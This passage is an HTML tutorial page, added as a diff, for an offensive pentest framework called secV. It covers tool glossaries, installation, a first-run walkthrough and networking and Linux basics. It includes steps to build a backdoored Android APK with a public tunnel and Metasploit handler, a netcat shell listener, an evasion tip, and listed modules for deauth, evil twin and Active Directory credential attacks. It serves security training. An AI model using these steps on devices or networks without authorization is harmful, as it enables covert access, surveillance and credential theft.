+      <div class="gloss-card">
+        <div class="gloss-term">JADX</div>
+        <div class="gloss-def">Decompiles DEX/APK bytecode into readable Java source code. Used in secV's static analysis operations to find hardcoded secrets, API keys, and vulnerable code patterns without running the app.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Frida</div>
+        <div class="gloss-def">Dynamic instrumentation — injects JavaScript into running processes. Requires <code>frida-server</code> running on the Android device (push via ADB). secV uses it to bypass SSL pinning, root detection, and extract runtime secrets.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Objection</div>
+        <div class="gloss-def">A mobile pentest toolkit built on Frida. Provides one-command bypasses for common Android/iOS defenses: <code>android sslpinning disable</code>, <code>android root disable</code>, memory dumps. secV wraps it in the <code>objection_explore</code> operation.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">nmap</div>
+        <div class="gloss-def">Network scanner — discovers live hosts, open ports, running services, and OS versions on a network. The backbone of secV's <code>netrecon</code> module. Most basic use: <code>nmap -sV 192.168.1.0/24</code>.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">scrcpy</div>
+        <div class="gloss-def">Screen mirror an Android device to your desktop via ADB. secV uses it in the <code>screen_mirror</code> operation for live visual access during a session.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">apksigner</div>
+        <div class="gloss-def">Signs APKs with a keystore (certificate). Android requires all APKs to be signed before installation. secV auto-generates a debug keystore (<code>secv_debug.keystore</code>) for signing modified APKs after apktool patching.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Category: secV-specific -->
+  <div class="gloss-section">
+    <div class="gloss-cat-header">
+      <div class="gloss-cat-dot" style="background:var(--white)"></div>
+      <span class="gloss-cat-name" style="color:var(--ash)">secV Framework — Internal Terms</span>
+    </div>
+    <div class="gloss-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">Module</div>
+        <div class="gloss-def">A self-contained Python tool in secV. Each module has a name (e.g. <code>android_pentest</code>), a set of operations, and a JSON I/O protocol. Run from the secV shell: <code>use android_pentest</code>.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Operation</div>
+        <div class="gloss-def">A specific action within a module, set via the <code>operation</code> parameter. Example: <code>set operation recon</code> runs device reconnaissance; <code>set operation backdoor_apk</code> injects a payload into an APK.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Params / Parameters</div>
+        <div class="gloss-def">Input values for an operation: target device, IP address, port number, file paths, etc. Set in the secV shell with <code>set param_name value</code> before running. Listed per-operation in each module's documentation.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Findings</div>
+        <div class="gloss-def">Structured JSON output from a module run — vulnerabilities found, files created, URLs generated, status codes. Printed as <code>RESULT {...}</code> to stdout. The secV shell parses these into the session.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Work Directory</div>
+        <div class="gloss-def">Auto-created per-session folder at <code>~/.secv/&lt;module&gt;/&lt;device&gt;/&lt;timestamp&gt;/</code>. Contains all generated files: APKs, handler.rc, bore logs, decoded app sources. Browse it in the GUI's Files tab.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">handler.rc</div>
+        <div class="gloss-def">A Metasploit resource script auto-generated by secV. Contains the exact <code>use</code> / <code>set PAYLOAD</code> / <code>set LHOST</code> / <code>exploit -j</code> commands. Run it: <code>msfconsole -q -r ~/.secv/.../handler.rc</code>.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">GUI Mode</div>
+        <div class="gloss-def">Run a module with <code>mode=gui</code> to launch a web-based control panel at <code>http://localhost:PORT</code>. The GUI provides form inputs for every operation, a live log stream, a file browser, and (for android_pentest) a C2 dashboard.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Bore WAN Tunnel</div>
+        <div class="gloss-def">secV automatically opens a <code>bore</code> tunnel for every WAN-facing operation. The tunnel maps <code>bore.pub:RANDOM_PORT → localhost:LPORT</code>. The bore public URL is embedded in the payload at generation time so callbacks work across the internet.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<hr class="rule">
+
+<!-- PREREQUISITES -->
+<div class="wrap" id="prereqs">
+  <div class="section-label">
+    <span class="section-num">02</span>
+    <span>Prerequisites</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>What You Need <span class="h2-alt">Installed</span></h2>
+
+  <div class="prereq-grid">
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="prereq-card-title dot" style="background:var(--green)"></div>secV Core</div>
+      <ul class="prereq-list">
+        <li><code>git clone https://github.com/secvulnhub/secV</code></li>
+        <li><code>cd secV &amp;&amp; bash install.sh</code> — installs all deps</li>
+        <li>Go 1.21+ for the shell binary</li>
+        <li>Python 3.10+ for all modules</li>
+        <li>Verify: <code>./secv help</code></li>
+      </ul>
+    </div>
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="prereq-card-title dot" style="background:var(--amber)"></div>Android Testing</div>
+      <ul class="prereq-list">
+        <li><strong>android-tools</strong> — ADB + fastboot: <code>pacman -S android-tools</code></li>
+        <li><strong>apktool</strong>: <code>yay -S android-apktool-bin</code></li>
+        <li><strong>metasploit</strong>: <code>yay -S metasploit</code></li>
+        <li><strong>bore</strong>: see rqm.md manual install</li>
+        <li>On device: Enable USB Debugging in Developer Options</li>
+        <li>On device: Enable Install Unknown Apps for your browser</li>
+      </ul>
+    </div>
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="prereq-card-title dot" style="background:var(--blue)"></div>Network Testing</div>
+      <ul class="prereq-list">
+        <li><strong>nmap</strong>: <code>pacman -S nmap nmap-ncat</code></li>
+        <li><strong>masscan</strong> (optional): <code>yay -S masscan</code></li>
+        <li><strong>rustscan</strong> (optional): <code>yay -S rustscan</code></li>
+        <li>Run scans as root for SYN scanning: <code>sudo nmap</code></li>
+      </ul>
+    </div>
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="prereq-card-title dot" style="background:var(--purple)"></div>Bluetooth Testing</div>
+      <ul class="prereq-list">
+        <li><strong>bluez + bluez-utils</strong>: <code>pacman -S bluez bluez-utils</code></li>
+        <li>Start service: <code>systemctl enable --now bluetooth</code></li>
+        <li>Unblock: <code>rfkill unblock bluetooth</code></li>
+        <li>CAP_NET_RAW for BT sockets: <code>sudo setcap cap_net_raw+eip $(which python3)</code></li>
+        <li>Physical Bluetooth adapter required (built-in or USB dongle)</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="info-box">
+    <strong>Arch Linux / ChaOS / CachyOS:</strong> All secV dependencies are available via <code>pacman</code> (official repos) or <code>yay</code> (AUR).
+    The <code>install.sh</code> script detects your distro and installs the right packages.
+    For Debian/Ubuntu/Kali, equivalent <code>apt</code> packages are listed in <code>tools/mobile/android/rqm.md</code>.
+  </div>
+</div>
+
+<hr class="rule">
+
+<!-- FIRST RUN -->
+<div class="wrap" id="first-run">
+  <div class="section-label">
+    <span class="section-num">03</span>
+    <span>First Run</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Your First <span class="h2-alt">10 Minutes</span></h2>
+
+  <ul class="steps">
+    <li class="step-item">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-title">Clone &amp; Install secV</div>
+        <div class="step-body">Run the install script once. It pulls all pip, pacman, and AUR dependencies listed in each module's <code>rqm.md</code>.</div>
+        <pre class="step-code">git clone https://github.com/secvulnhub/secV
+cd secV
+bash install.sh</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-title">Launch the secV Shell</div>
+        <div class="step-body">The Go shell is your command center. Tab-completion works for module names and parameters.</div>
+        <pre class="step-code">./secv
+<span class="cm"># You'll see the secV prompt:</span>
+secV &gt;</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-title">Run a Network Scan on Your Own Machine</div>
+        <div class="step-body">Use <code>127.0.0.1</code> (loopback — your own machine) as the target. This is safe, legal, and confirms nmap and the module are working.</div>
+        <pre class="step-code">secV &gt; <span class="hl">use</span> netrecon
+secV &gt; <span class="hl">set</span> target 127.0.0.1
+secV &gt; <span class="hl">run</span>
+<span class="cm"># Output: open ports, service versions, OS guess</span></pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-title">Connect an Android Device (ADB)</div>
+        <div class="step-body">Enable USB Debugging on your Android phone (Settings → Developer Options → USB Debugging), connect via USB, and authorize the connection when prompted on-screen.</div>
+        <pre class="step-code">adb devices
+<span class="cm"># Should list your device serial number</span>
+adb -s &lt;serial&gt; shell getprop ro.product.model
+<span class="cm"># Alternative: WiFi ADB (after USB auth)</span>
+adb tcpip 5555
+adb connect 192.168.1.x:5555</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-title">Run Android Recon</div>
+        <div class="step-body">The <code>recon</code> operation is read-only — it just queries device info and installed apps. Safe to run as a first test.</div>
+        <pre class="step-code">secV &gt; <span class="hl">use</span> android_pentest
+secV &gt; <span class="hl">set</span> device 192.168.1.x:5555
+secV &gt; <span class="hl">set</span> operation recon
+secV &gt; <span class="hl">run</span>
+<span class="cm"># Output: Android version, patch level, installed apps, root status</span></pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">6</div>
+      <div class="step-content">
+        <div class="step-title">Generate Your First Payload APK</div>
+        <div class="step-body">This creates a backdoored APK and starts a bore WAN tunnel + Metasploit handler. Run this on a device you own. Replace the IP with your machine's LAN IP.</div>
+        <pre class="step-code">secV &gt; <span class="hl">set</span> operation deploy_shell
+secV &gt; <span class="hl">set</span> lhost 192.168.1.x
+secV &gt; <span class="hl">set</span> lport 4444
+secV &gt; <span class="hl">run</span>
+<span class="cm"># Output: APK installed, handler.rc path, bore WAN URL
+# In a second terminal:</span>
+msfconsole -q -r ~/.secv/android/.../handler.rc</pre>
+      </div>
+    </li>
+  </ul>
+</div>
+
+<hr class="rule">
+
+<!-- MODULE QUICKSTART TABLE -->
+<div class="wrap" id="modules">
+  <div class="section-label">
+    <span class="section-num">04</span>
+    <span>Module Index</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>All Modules — <span class="h2-alt">Difficulty &amp; First Step</span></h2>
+
+  <div class="qs-table-wrap">
+  <table class="qs-table">
+    <thead>
+      <tr>
+        <th>Module</th>
+        <th>Category</th>
+        <th>Difficulty</th>
+        <th>What it does</th>
+        <th>Your first operation</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><a href="modules/netrecon.html">netrecon</a></td>
+        <td>Network · Recon</td>
+        <td><span class="diff-badge diff-1">Beginner</span></td>
+        <td>Scan a network for open ports, services, CVEs, and IoT devices using nmap/masscan/rustscan.</td>
+        <td><code>set target 127.0.0.1 → run</code> — scans your own machine</td>
+      </tr>
+      <tr>
+        <td><a href="modules/android_pentest.html">android_pentest</a></td>
+        <td>Mobile · Android</td>
+        <td><span class="diff-badge diff-2">Intermediate</span></td>
+        <td>Full Android pentest suite — recon, payload delivery, C2, Frida instrumentation, screen mirror, audio capture.</td>
+        <td><code>set operation recon → run</code> — read-only device info gathering</td>
+      </tr>
+      <tr>
+        <td><a href="modules/websec.html">websec</a></td>
+        <td>Web · Application</td>
+        <td><span class="diff-badge diff-1">Beginner</span></td>
+        <td>Web application security scanning — SQLi, XSS, directory brute force, header analysis, auth bypass.</td>
+        <td><code>set target http://testphp.vulnweb.com → run</code></td>
+      </tr>
+      <tr>
+        <td><a href="modules/wifi_monitor.html">wifi_monitor</a></td>
+        <td>WiFi · Network</td>
+        <td><span class="diff-badge diff-2">Intermediate</span></td>
+        <td>WiFi monitoring, WPA handshake capture, deauth attacks, beacon flood, evil twin setup.</td>
+        <td>Requires a WiFi adapter that supports monitor mode. <code>set operation scan → run</code></td>
+      </tr>
+      <tr>
+        <td><a href="modules/ios_pentest.html">ios_pentest</a></td>
+        <td>Mobile · iOS</td>
+        <td><span class="diff-badge diff-3">Advanced</span></td>
+        <td>iOS app analysis, Frida hooks, plist extraction, keychain dumping. Requires jailbroken device or developer cert.</td>
+        <td>Connect jailbroken iPhone via USB. <code>set operation recon → run</code></td>
+      </tr>
+      <tr>
+        <td><a href="modules/windowsAD.html">windowsAD</a></td>
+        <td>Windows · Active Directory</td>
+        <td><span class="diff-badge diff-3">Advanced</span></td>
+        <td>AD enumeration, Kerberoasting, AS-REP roasting, pass-the-hash, DCSync, BloodHound integration.</td>
+        <td>Requires an AD domain. <code>set operation enum → run</code></td>
+      </tr>
+      <tr>
+        <td><a href="modules/adsec.html">adsec</a></td>
+        <td>Active Directory · Offense</td>
+        <td><span class="diff-badge diff-3">Advanced</span></td>
+        <td>Advanced AD attack chains — Golden/Silver ticket, DCSYNC, lateral movement, persistence.</td>
+        <td>Use after windowsAD enumeration provides domain context.</td>
+      </tr>
+      <tr>
+        <td><a href="modules/iot_pwn.html">iot_pwn</a></td>
+        <td>IoT · Embedded</td>
+        <td><span class="diff-badge diff-2">Intermediate</span></td>
+        <td>IoT device exploitation — firmware analysis, default credential testing, MQTT/Modbus/RTSP attacks.</td>
+        <td><code>set operation scan → run</code> — discovers IoT on local network</td>
+      </tr>
+      <tr>
+        <td><a href="modules/mac_spoof.html">mac_spoof</a></td>
+        <td>Network · Identity</td>
+        <td><span class="diff-badge diff-1">Beginner</span></td>
+        <td>Randomize or set your network adapter's MAC address to avoid fingerprinting on target networks.</td>
+        <td><code>set interface eth0 → set mode random → run</code></td>
+      </tr>
+      <tr>
+        <td><a href="modules/ctfpwn.html">ctfpwn</a></td>
+        <td>CTF · Binary</td>
+        <td><span class="diff-badge diff-2">Intermediate</span></td>
+        <td>CTF-focused: binary exploitation, ROP chain building, format string, heap challenges. Integrates with pwntools.</td>
+        <td>Download a CTF binary, <code>set binary ./chall → set operation analyze → run</code></td>
+      </tr>
+    </tbody>
+  </table>
+  </div>
+</div>
+
+<hr class="rule">
+
+<!-- SECTION 05: HOW COMPUTERS COMMUNICATE -->
+<div class="wrap" id="networking">
+  <div class="section-label">
+    <span class="section-num">05</span>
+    <span>Networking Fundamentals</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>How Computers <span class="h2-alt">Communicate</span></h2>
+  <p style="font-size:.7rem;color:var(--fog);max-width:700px;line-height:1.9;margin-bottom:2rem">
+    Every secV module — netrecon, android_pentest, websec, wifi_monitor — touches network protocols.
+    You don't need to memorize every RFC, but you need to understand IP addresses, ports, and packets
+    well enough to read scan output and understand what's happening when an attack fires.
+  </p>
+
+  <h3>IP Addresses — What They Are at the Byte Level</h3>
+  <div class="prereq-grid">
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--blue)"></div>IPv4 Address</div>
+      <div style="font-size:.6rem;color:var(--fog);line-height:1.8;margin-bottom:.7rem">
+        An IPv4 address is exactly <strong style="color:var(--ash)">4 bytes (32 bits)</strong>, written as four
+        decimal numbers 0–255 separated by dots. Each number is one byte.
+      </div>
+      <pre class="step-code">192.168.1.100
+ ↑   ↑   ↑  ↑
+ │   │   │  └─ 4th byte = 0x64 = 100
+ │   │   └──── 3rd byte = 0x01 = 1
+ │   └──────── 2nd byte = 0xA8 = 168
+ └──────────── 1st byte = 0xC0 = 192
+
+On the wire: C0 A8 01 64  (4 raw bytes in IP header)</pre>
+    </div>
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--blue)"></div>Special Addresses</div>
+      <ul class="prereq-list">
+        <li><code>127.0.0.1</code> — <strong>loopback</strong> — your own machine. Traffic never leaves the NIC.</li>
+        <li><code>192.168.x.x</code> — <strong>private LAN</strong> — home/office network. Not routable on internet.</li>
+        <li><code>10.x.x.x</code> — another private range. VMs often use 10.0.2.x</li>
+        <li><code>172.16–31.x.x</code> — third private range. Docker uses 172.17.0.x</li>
+        <li><code>255.255.255.255</code> — <strong>broadcast</strong> — every device on the subnet receives it</li>
+        <li><code>0.0.0.0</code> — <strong>any/all interfaces</strong> — used in server binds (listen on all NICs)</li>
+      </ul>
+    </div>
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--blue)"></div>Subnet / CIDR</div>
+      <div style="font-size:.6rem;color:var(--fog);line-height:1.8">
+        A subnet is a range of IP addresses sharing the same network. CIDR notation: <code>192.168.1.0/24</code><br><br>
+        The <code>/24</code> means the first 24 bits (3 bytes) are the network = <code>192.168.1.</code><br>
+        The last 8 bits are host addresses → 256 possible addresses → 254 usable (0=network, 255=broadcast)<br><br>
+        <code>/16</code> = 65,534 hosts &nbsp;|&nbsp; <code>/24</code> = 254 hosts &nbsp;|&nbsp; <code>/30</code> = 2 hosts
+      </div>
+    </div>
+  </div>
+
+  <h3>Ports — What They Are and Why They Matter</h3>
+  <div style="font-size:.7rem;color:var(--fog);max-width:700px;line-height:1.9;margin-bottom:1.2rem">
+    A <strong style="color:var(--ash)">port</strong> is a 16-bit number (0–65535) that identifies which
+    application on a machine should receive incoming traffic. When your browser connects to a website,
+    it connects to port 443 (HTTPS). Your mail client connects to port 993 (IMAPS). Ports let one
+    machine run dozens of services simultaneously — the OS routes each incoming connection to the
+    correct application based on the port number.
+  </div>
+  <div class="gloss-grid" style="margin-bottom:2rem">
+    <div class="gloss-card">
+      <div class="gloss-term">Port 22 — SSH</div>
+      <div class="gloss-def">Secure Shell — encrypted remote terminal. If open on a server, attackers try credential brute force or stolen keys. <code>ssh user@192.168.1.10</code></div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Port 80 — HTTP</div>
+      <div class="gloss-def">Plain-text web traffic. All data visible on the wire — credentials, cookies, content. netrecon flags open HTTP on internal servers as a finding.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Port 443 — HTTPS</div>
+      <div class="gloss-def">HTTP inside TLS encryption. Meterpreter uses this port for its C2 tunnel — traffic looks identical to normal web browsing to a firewall.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Port 445 — SMB</div>
+      <div class="gloss-def">Windows file sharing. Used for lateral movement in Windows networks (PsExec, WMI). EternalBlue (WannaCry) ran on this port. Always flag this on internet-facing systems.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Port 3389 — RDP</div>
+      <div class="gloss-def">Windows Remote Desktop. A very common entry point — organizations leave it internet-exposed, attackers brute force or use stolen credentials.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Port 5555 — ADB</div>
+      <div class="gloss-def">Android Debug Bridge over TCP. If an Android device has this port open on the network, anyone can run ADB commands on it without authentication. netrecon's android preset specifically looks for this.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Port 1883 — MQTT</div>
+      <div class="gloss-def">IoT messaging protocol. Smart home devices, sensors, and industrial equipment often use MQTT with no authentication. iot_pwn scans for open MQTT brokers.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Port 4444</div>
+      <div class="gloss-def">Default Metasploit/Meterpreter handler port. Not a standard service — it's just conventional. secV uses it by default for LPORT. Change it to 443 or 8443 for better evasion.</div>
+    </div>
+  </div>
+
+  <h3>What is a Packet?</h3>
+  <div style="font-size:.7rem;color:var(--fog);max-width:700px;line-height:1.9;margin-bottom:1rem">
+    When two computers communicate, they don't send one giant stream of data — they break it into
+    <strong style="color:var(--ash)">packets</strong>. Each packet has a header (routing information)
+    and a payload (the actual data). Routers read headers to forward packets; firewalls and IDS inspect
+    headers and payloads to decide whether to allow or block traffic.
+  </div>
+  <pre class="step-code">┌────────────────────────────────────────────────────────────────┐
+│  Ethernet Frame (Layer 2)                                      │
+│  ┌──────────────────────────────────────────────────────────┐  │
+│  │  IP Packet (Layer 3)                                     │  │
+│  │  ┌────────────────────────────────────────────────────┐  │  │
+│  │  │  TCP Segment (Layer 4)                             │  │  │
+│  │  │  ┌──────────────────────────────────────────────┐  │  │  │
+│  │  │  │  Application Data (Layer 7)                  │  │  │  │
+│  │  │  │  e.g. "GET / HTTP/1.1\r\nHost: site.com\r\n" │  │  │  │
+│  │  │  └──────────────────────────────────────────────┘  │  │  │
+│  │  │  src_port: 52341   dst_port: 443                    │  │  │
+│  │  │  seq: 0x11223344   ack: 0x44332211                  │  │  │
+│  │  └────────────────────────────────────────────────────┘  │  │
+│  │  src_ip: 192.168.1.50   dst_ip: 93.184.216.34           │  │
+│  │  ttl: 64   protocol: 6 (TCP)                            │  │
+│  └──────────────────────────────────────────────────────────┘  │
+│  src_mac: aa:bb:cc:dd:ee:ff   dst_mac: 00:11:22:33:44:55      │
+└────────────────────────────────────────────────────────────────┘</pre>
+
+  <h3>TCP vs UDP — Two Ways to Send Data</h3>
+  <div class="prereq-grid">
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--green)"></div>TCP — Reliable</div>
+      <ul class="prereq-list">
+        <li><strong>Connection-oriented</strong> — 3-way handshake before data flows (SYN → SYN-ACK → ACK)</li>
+        <li><strong>Guaranteed delivery</strong> — lost packets are automatically re-sent</li>
+        <li><strong>In-order</strong> — packets re-assembled in correct sequence</li>
+        <li>Used by: HTTP/HTTPS, SSH, SMB, Meterpreter, ADB, most attack tools</li>
+        <li>nmap SYN scan (<code>-sS</code>) sends a SYN, waits for SYN-ACK to confirm port open</li>
+      </ul>
+    </div>
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--amber)"></div>UDP — Fast</div>
+      <ul class="prereq-list">
+        <li><strong>Connectionless</strong> — no handshake, just send and hope it arrives</li>
+        <li><strong>No delivery guarantee</strong> — lost packets are gone</li>
+        <li>Used by: DNS (port 53), DHCP, SNMP, MQTT, NTP, streaming</li>
+        <li>nmap UDP scan (<code>-sU</code>) is slow — closed ports send ICMP port unreachable; open ports often say nothing</li>
+        <li>DNS is a common lateral movement vector — DNS queries bypass many firewalls</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<hr class="rule">
+
+<!-- SECTION 06: THE ATTACK LIFECYCLE -->
+<div class="wrap" id="kill-chain">
+  <div class="section-label">
+    <span class="section-num">06</span>
+    <span>The Attack Lifecycle</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>How Attacks <span class="h2-alt">Actually Work</span></h2>
+  <p style="font-size:.7rem;color:var(--fog);max-width:700px;line-height:1.9;margin-bottom:2rem">
+    Real attacks follow a pattern. Lockheed Martin's <strong style="color:var(--ash)">Cyber Kill Chain</strong>
+    and MITRE's <strong style="color:var(--ash)">ATT&amp;CK framework</strong> document these stages.
+    Understanding the lifecycle tells you which secV module applies at each phase.
+  </p>
+
+  <div class="path-grid">
+    <div class="path-step">
+      <div class="path-num" style="color:rgba(74,222,128,.3)">01</div>
+      <div class="path-title" style="color:var(--green)">Reconnaissance</div>
+      <div class="path-desc">Gather intelligence about the target — IP ranges, open ports, services, employees, technologies, and potential vulnerabilities. All passive or lightly active, before any exploitation.</div>
+      <div style="font-size:.52rem;color:var(--dust);margin-top:.6rem">secV module: <strong style="color:var(--ash)">netrecon</strong></div>
+    </div>
+    <div class="path-step">
+      <div class="path-num" style="color:rgba(251,191,36,.3)">02</div>
+      <div class="path-title" style="color:var(--amber)">Weaponization</div>
+      <div class="path-desc">Build or customize the attack tool — create a malicious APK, generate a payload, prepare DuckyScript, craft a SQL injection string. The weapon is ready but not yet deployed.</div>
+      <div style="font-size:.52rem;color:var(--dust);margin-top:.6rem">secV modules: <strong style="color:var(--ash)">android_pentest, revshell, badusb</strong></div>
+    </div>
+    <div class="path-step">
+      <div class="path-num" style="color:rgba(251,191,36,.3)">03</div>
+      <div class="path-title" style="color:var(--amber)">Delivery</div>
+      <div class="path-desc">Get the weapon to the target — send a phishing link, plug in a USB device, push the APK via ADB/QR/Bluetooth, send a crafted HTTP request. Delivery is where social engineering often plays a role.</div>
+      <div style="font-size:.52rem;color:var(--dust);margin-top:.6rem">secV modules: <strong style="color:var(--ash)">badusb, android_pentest (bt_zero_deliver)</strong></div>
+    </div>
+    <div class="path-step">
+      <div class="path-num" style="color:rgba(248,113,113,.3)">04</div>
+      <div class="path-title" style="color:var(--red)">Exploitation</div>
+      <div class="path-desc">The weapon triggers — the vulnerability is exploited. An installed APK launches Meterpreter. A SQL injection extracts the database. A buffer overflow spawns a shell. Exploitation is the moment of initial access.</div>
+      <div style="font-size:.52rem;color:var(--dust);margin-top:.6rem">secV modules: <strong style="color:var(--ash)">android_pentest, websec, windowsAD</strong></div>
+    </div>
+    <div class="path-step">
+      <div class="path-num" style="color:rgba(248,113,113,.3)">05</div>
+      <div class="path-title" style="color:var(--red)">Installation</div>
+      <div class="path-desc">Establish persistence — install a backdoor, register a BootReceiver, create a scheduled task, add a registry key — so access survives reboots, logouts, and password changes.</div>
+      <div style="font-size:.52rem;color:var(--dust);margin-top:.6rem">secV modules: <strong style="color:var(--ash)">android_pentest (boot_persist), windowsAD (persist)</strong></div>
+    </div>
+    <div class="path-step">
+      <div class="path-num" style="color:rgba(192,132,252,.3)">06</div>
+      <div class="path-title" style="color:var(--purple)">Command &amp; Control (C2)</div>
+      <div class="path-desc">The compromised system connects back to the attacker — a Meterpreter session, a reverse shell, a Sliver agent. The attacker now has an interactive channel to issue commands and receive output.</div>
+      <div style="font-size:.52rem;color:var(--dust);margin-top:.6rem">secV modules: <strong style="color:var(--ash)">revshell, android_pentest (c2_gui), windowsAD (sliver)</strong></div>
+    </div>
+    <div class="path-step" style="grid-column:span 2">
+      <div class="path-num" style="color:rgba(96,165,250,.3)">07</div>
+      <div class="path-title" style="color:var(--blue)">Actions on Objectives</div>
+      <div class="path-desc">Execute the actual goal — dump credentials, exfiltrate files, move laterally to other systems, escalate privileges, access the final target. In a pentest, this phase produces the evidence for the report.</div>
+      <div style="font-size:.52rem;color:var(--dust);margin-top:.6rem">secV modules: <strong style="color:var(--ash)">windowsAD (loot, secrets), android_pentest (file_manager, process_inject), websec (sqli data extraction)</strong></div>
+    </div>
+  </div>
+
+  <div class="info-box" style="margin-top:0">
+    <strong>MITRE ATT&amp;CK:</strong> A comprehensive framework cataloguing every known attacker technique by tactic and platform.
+    Free at <code>attack.mitre.org</code>. When secV finds a vulnerability, cross-referencing ATT&amp;CK gives you the exact technique ID
+    to include in your pentest report — e.g. T1190 (Exploit Public-Facing Application) or T1059.001 (PowerShell).
+  </div>
+</div>
+
+<hr class="rule">
+
+<!-- SECTION 07: LINUX SURVIVAL GUIDE -->
+<div class="wrap" id="linux-basics">
+  <div class="section-label">
+    <span class="section-num">07</span>
+    <span>Linux Survival Guide</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Linux Commands You <span class="h2-alt">Must Know</span></h2>
+  <p style="font-size:.7rem;color:var(--fog);max-width:700px;line-height:1.9;margin-bottom:2rem">
+    secV runs on Linux (Kali, Arch, Ubuntu). Every module uses the terminal. You don't need to be
+    a Linux expert, but you need to be comfortable with the commands below — they appear in module
+    outputs, dependency installation, and troubleshooting.
+  </p>
+
+  <h3>File System Navigation</h3>
+  <pre class="step-code">pwd                   # Print Working Directory — where you are right now
+ls -la                # List files including hidden (.) files + permissions
+ls -lh /path          # Human-readable sizes (KB, MB, GB)
+cd /home/user/secV    # Change directory (absolute path)
+cd ..                 # Go up one directory
+cd ~                  # Go to your home directory (/home/username)
+mkdir -p a/b/c        # Create nested directories (no error if exists)
+rm -rf dir/           # Delete directory and all contents (irreversible — be careful)
+cp -r src/ dst/       # Copy directory recursively
+mv old.txt new.txt    # Move/rename a file
+find . -name "*.py"   # Find files matching pattern in current directory
+which nmap            # Show full path of a command (/usr/bin/nmap)</pre>
+
+  <h3>Reading and Writing Files</h3>
+  <pre class="step-code">cat file.txt           # Print entire file to terminal
+less file.txt          # Scrollable file viewer (q to quit)
+head -n 20 file.txt    # First 20 lines
+tail -f /var/log/syslog # Follow file as it grows (live logs)
+grep "error" file.txt  # Find lines containing "error"
+grep -r "password" .   # Recursively grep entire directory
+grep -i "ERROR" *.log  # Case-insensitive grep
+echo "text" > file.txt # Write text to file (overwrites)
+echo "text" >> file.txt # Append text to file
+nano file.txt          # Simple text editor (Ctrl+X to save+exit)</pre>
+
+  <h3>Networking Commands (Essential for Pentesting)</h3>
+  <pre class="step-code">ip a                   # Show all network interfaces + IP addresses
+ip route               # Show routing table (default gateway)
+hostname -I            # Print your IP(s) — quick way to find your LHOST
+ss -tulpn              # Show all listening ports + which process
+netstat -tulpn         # Alternative to ss (older systems)
+ping -c4 192.168.1.1   # Test connectivity (4 packets)
+traceroute 8.8.8.8     # Trace route to destination
+curl -I https://site.com  # Fetch just HTTP headers
+wget https://site.com/file -O local.file  # Download file
+nc -lvnp 4444          # Start netcat listener on port 4444 (catch shells here)
+nc 192.168.1.50 4444   # Connect to remote host:port</pre>
+
+  <h3>Process and Permissions</h3>
+  <pre class="step-code">ps aux                 # List all running processes
+ps aux | grep python3  # Find specific process
+kill -9 PID            # Force kill process by PID
+sudo command           # Run command as root (you'll need this for nmap -sS)
+sudo -l                # List what you can run as sudo (useful post-exploit)
+chmod +x script.sh     # Make script executable
+chmod 700 file         # Owner can read/write/execute, others: nothing
+id                     # Show your current user ID and groups
+whoami                 # Just your username
+su - alice             # Switch to user alice (if you know the password)
+# "uid=0(root)" in id output = you have root / full control</pre>
+
+  <h3>Package Management (Install Tools)</h3>
+  <pre class="step-code"># Arch / CachyOS (secV's primary platform):
+sudo pacman -S nmap    # Install nmap
+yay -S apktool         # Install from AUR (community packages)
+sudo pacman -Syu       # Update all packages
+
+# Kali / Debian / Ubuntu:
+sudo apt update        # Refresh package list first
+sudo apt install nmap  # Install nmap
+sudo apt install -y metasploit-framework  # Install Metasploit
+
+# Python packages (any distro):
+pip3 install frida-tools        # Install Python package
